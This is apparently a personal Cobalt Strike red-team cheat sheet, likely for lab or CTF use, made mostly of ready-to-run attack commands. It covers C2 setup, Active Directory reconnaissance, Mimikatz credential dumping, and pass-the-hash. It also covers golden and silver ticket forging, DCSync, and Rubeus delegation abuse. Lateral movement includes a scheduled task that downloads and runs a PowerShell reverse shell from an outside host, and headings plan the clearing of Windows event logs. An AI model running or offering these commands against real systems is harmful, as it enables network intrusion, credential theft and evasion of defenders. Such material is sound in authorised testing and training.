###############################################
###############################################
##                                           ##
##              COBALT STRIKE                ##
##                                           ##
###############################################
###############################################

===============================================
INITIAL SET UP
===============================================
# TEAMSERVER
cd /opt/CS/cobaltstrike
sudo su

export ETH1_IP=$(ip addr | grep eth1 | grep inet | awk '{print $2}' | cut -d/ -f1)

./teamserver $ETH1_IP coolstorybro! add-ons/MALC2/BSJeff-C2/cnnvideo_getonly.profile

# CLIENT
cd /opt/CS/cobaltstrike
sudo su

export ETH1_IP=$(ip addr | grep eth1 | grep inet | awk '{print $2}' | cut -d/ -f1)
./cobaltstrike


# FILE SHARING BETWEEN ATTACK AND WIN10-DEV
/usr/local/bin/smbserver.py -comment SHARE -smb2support SHARE `pwd`

===============================================
MALLEABLE C2 UPDATES - 
===============================================
# REFERENCES
https://github.com/threatexpress/malleable-c2
http://threatexpress.com/blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/
https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.13.profile

#useragents
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Edge/44.18362.449.0"

#spawning and pipes -MUST USE DOUBLE QUOTES
set spawnto_x86 "%windir\\syswow64\\userinit.exe";
set spawnto_x64 "%windir\\sysnative\\userinit.exe";
set pipename "interprocess_##";


===============================================
OBFUSCATION - 
===============================================

# ARGUE

argue shell wmic /Node:%%A LogicalDisk Where DriveType="3" Get DeviceID,FileSystem,FreeSpace,Size /Format:csv MORE /E +2 >> SRVSPACE.CSV

# POWERPICK / UNMANAGED POWERSHELL
powerpick <commandlet>



===============================================
INTERNAL RECONNAISSANCE AND ENUMERATION
===============================================

# AS ANY USER ON THE DOMAIN - PULLING LOCAL ARTIFACTS AND BASIC WINDOWS COMMANDS

getuid
shell whoami /all
shell quser
shell klist

shell tasklist /v

shell netstat -anto
shell netstat -rn

shell ipconfig /all
shell ipconfig /displaydns
shell type C:\Windows\System32\drivers\etc\hosts
shell nbtstat -c
shell nbtstat -N

shell systeminfo

shell auditpol /get /category:*
shell schtasks
shell schtasks /query /fo LIST /v

shell net start
shell wmic service get pathname,name,startmode,startname
shell wmic service where "STARTMODE LIKE 'AUTO' AND STARTNAME LIKE 'LocalSystem'" get pathname,name,startmode,startname

drives
powershell get-psdrive
shell vol
shell fsutil fsinfo drives
shell fsutil volume diskfree C:
shell vssadmin list shadows

shell dir /a C:\
shell dir /a "C:\Program Files"
shell dir /a "C:\Program Files (x86)"
shell dir /a C:\Users
shell dir /a "C:\$Recycle.Bin"

net user
net user /domain
net group "Domain Admins" /domain
net view

shell net use
shell net share
shell net session

shell netsh firewall show opmode
shell netsh firewall show config
shell netsh advfirewall firewall show rule profile=domain name=all
shell netsh advfirewall show allprofiles
shell netsh advfirewall firewall show rule all
shell netsh interface portproxy show all

shell dir /a /w /s /x C:\ > C:\Windows\TEMP\Directories.txt

powershell $psversiontable
powershell Get-ExecutionPolicy
powershell Get-MpPreference
powershell Get-Module -ListAvailable

powershell $ExecutionContext.SessionState.LanguageMode
powershell Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

shell reg query HKLM\Software
shell reg query HKLM\System



# BUILT-IN WINDOWS PCAPS 
shell netsh trace start capture=yes overwrite=no tracefile=C:\Windows\TEMP\sniff.etl
shell netsh trace stop

# PULLING CREDS WITH MIMIKATZ
hashdump
logonpasswords

# AS ANY DOMAIN USER - PORTSCAN TO ID OPEN PORTS
* CS BUILT IN - 
portscan [range] [ports] [arp|icmp|none]

* With POWERSHELL MAFIA
powershell-import /opt/POWERSHELL-MAFIA/Recon/Invoke-Portscan.ps1


# AS ANY DOMAIN USER - POWERVIEW 2.0
powershell-import /opt/POWERSHELL-MAFIA/Recon/PowerView.ps1

powershell Get-NetDomain
powershell Get-NetForest
powershell Get-NetForestCatalogue

powershell Get-NetUser
powershell Get-NetUser -SPN
powershell Get-NetUser -Filter '(sidHistory=*)'

powershell Get-NetComputer 
powershell Get-IPAddress -ComputerName

powershell Get-NetGroup
powershell Get-NetGroup -MemberIdentity 

powershell Get-NetGroupMember 'Domain Admins' -Recurse

powershell Get-NetOU

powershell Get-NetGPO
powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
powershell Get-NetGPOGroup

powershell Invoke-UserHunter -AdminCount
powershell Invoke-UserHunter -ShowAll

powershell Invoke-ACLScanner
powershell Invoke-ACLScanner -ResolveGUIDs -ADSPath 'OU=Accounts,DC=LAB,DC=adsecurity,DC=org' | Where-Object {$_.ActiveDirectoryRights -eq 'GenericAll'}
		OR: powershell Invoke-ACLScanner -ResolveGUIDs -ADSPath 'LDAP://OU=Accounts,DC=LAB,DC=adsecurity,DC=org' | Where-Object {$_.ActiveDirectoryRights -eq 'GenericAll'}

powershell Get-ObjectACL -SamAccountName <current-user> -RightsFilter All -ResolveGUIDs
		-RightsFilter All|ResetPassword|WriteMembers

powershell Find-LocalAdminAccess

powershell Invoke-FileFinder -SearchSYSVOL

* LAPS ACLs for all OUs where someone is allowed to read the LAPS password attribute:
powershell Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectType -like 'ms_Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } | ForeEach- Object { $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID; $_ }


powershell Get-NetDomainTrust
powershell Get-NetForestTrust



* TO SHOW FUNCTION OPTIONS - 
egrep -i '^Function ' /opt/POWERSHELL-MAFIA/Recon/PowerView.ps1

# AS ANY DOMAIN USER - POWERVIEW 3.0/dev
powershell-import /opt/POWERSHELL-MAFIA/Recon/PowerView3.ps1

powershell Get-Domain
powershell Get-Forest
powershell Get-DomainDNSRecord

powershell Get-DomainUSer
powershell Get-DomainUSer -SPN
powershell Get-DomainUser -LDAPFilter '(sidHistory=*)'

* CONSTRAINED DELEGATION
powershell Get-DomainUSer -TrustedToAuth
powershell Get-DomainComputer -TrustedToAuth

powershell Get-DomainGroupMember -Identity "Domain Admins" -Recurse


* WHO CAN DCSYNC - 
powershell Get-DomainObjectACL "dc=els-child,dc=els,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}

# AS ANY DOMAIN USER - BLOODHOUND
neo4j console
bloodhound

powershell-import /home/USER/Documents/HTB/OFFSHORE/SHARE/SharpHound.ps1
powershell get-executionpolicy
powershell invoke-bloodhound -collectionmethod all


# POWERSHELL PORT-SCANNER
$ports=(21,22,23,25,53,79,80,88,110,143,139,445,443,464,993,995,3268,3269,5985,5986,3389,5900,1432,1433,5432,5433,1521,2222,2121,2323,8080,8443); $ip="172.16.1.24"; foreach ($port in $ports){try{$socket=New-Object System.Net.Sockets.TcpClient($ip,$port);} catch{}; if($socket -eq $null) {echo $ip":"$port" - Closed broseef";}else{echo $ip":"$port" - OPEN DUDE!"; $socket = $null;}}


===============================================
CREDENTIALS
===============================================

# [Over]PASS THE HASH
pth child.parentdomain.local\Administrator 311b090a887d3fe6578c2afa9264a6dd

# MAKING / STEALING TOKENS
steal_token
make_token

# GOLDEN TICKETS - valid TGT - what makes it valid? --> its encrypted with the NTLM hash of the krbtgt account
mimikatz kerberos::golden 
/user:administrator 
/domain:child.parent.com 
/sid:S-1-5-21-1874506631-3219952063-538504511
/krbtgt:ff4asd8bd66c6efd77603da26796f35
/id:500
/groups:512
/startoffset:0
/endin:600
/renewmax:10080
/ptt

powershell Invoke-Mimikatz -Command '"kerberos::golden .../ptt"'

powershell Invoke-Mimikatz -Command '"lsadump::dcsync /user:child\administrator"'

# SILVER TICKETS - valid TGS - what makes it valid? --> its encrypted with the NTLM hash of the service (HOST MACHINE) account 
mimikatz kerberos::golden 
/user:administrator 
/domain:child.parent.com 
/sid:S-1-5-21-1874506631-3219952063-538504511
/target:computer_account.child.parent.com 
/service:HOST_OR_WINRM_OR_RPCSS_OR_CIFS_OR_LDAP
/rc4:ntlm_of_computer_account 
/user:Administrator 
/ptt

powershell Invoke-Mimikatz -Command '"kerberos::golden ... /ptt"'

# DCSYNC - Using CobaltStrike
dcsync parent.com parent\Administrator


===============================================
LATERAL MOVEMENT AND PIVOTING
===============================================

# REMOTE CODE EXECUTION - CHECK CREDS ABOVE
-- Windows command line 
-- WMIC commands
	wmic /node:<remotecomputername> PROCESS call create "<command to run>
-- Powershell commands
	pth child.parentdomain.local\Administrator 311b090a887d3fe6578c2afa9264a6dd
	powershell invoke-command -scriptblock {shell command;powershell commandlet} -computername fqdn.child.parent.local


# OPTH - Will flag Windows Defender
pth child.parentdomain.local\Administrator 311b090a887d3fe6578c2afa9264a6dd
psexec IP Beacon
psexec_psh IP Beacon

# OPTH - Will flag Windows Defender
pth child.parentdomain.local\Administrator 311b090a887d3fe6578c2afa9264a6dd
wmi IP Beacon

# OPTH - Will flag Windows Defender
pth child.parentdomain.local\Administrator 311b090a887d3fe6578c2afa9264a6dd
winrm FQDN Beacon


# SCHTASKS LATERAL MOVEMENT
shell schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR
"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
shell schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"


# SERVICES LATERAL MOVEMENT



# BURNING DOWN THE FOREST - GOING FROM CHILD TO PARENT DOMAIN THROUGH SID HISTORY
mimikatz kerberos::golden 
/user:administrator 
/domain:child.parent.com 
/sid:S-1-5-21-141678993-394318334-2645530166 
/krbtgt:9404def404bc173829830a3483869e78 /sids:S-1-5-21-12346317506-3509444512-4230741538-519 
/ptt
/startoffset:0
/endin:600
/renewmax:10080



# S4U ABUSE WITH RUBEUS|UNCONSTRAINED AND CONSTRAINED DELEGATION ABUSE
shell klist
kerberos_ticket_purge
dcsync parent.com parent\Administrator
execute-assembly /home/USER/rubeus.exe s4u /user:computer01$ /domain:aprent.com /rc4:<computer02$_ntlm_hash> /impersonateuser:administrator /msdsspn:"cifs/dc04.client.offshore.com" /altservice:ldap /ptt
dcsync parent.com parent\Administrator



===============================================
PERSISTENCE
===============================================

# IN-MEMORY TRIGGERABLE PERSISTENCE WITH SMB NAMED PIPES

# REGISTRY RUN KEYS

# SERVICES

# SCHEDULED TASKS

# GOLDEN TICKET

# SILVER TICKET

# SKELETON KEY

# DSRM

# ADMINSDHOLDER|ACLS 



===============================================
WINDOWS LOGGING
===============================================

# WEVTUTIL
	-- Query
	-- Kill
	-- Query

# Kill System, Kill Security, Kill Application, Kill Custom/s, Kill System Again - 

# SCHTASK Logs



# WEF Utilities and Off-box Logging







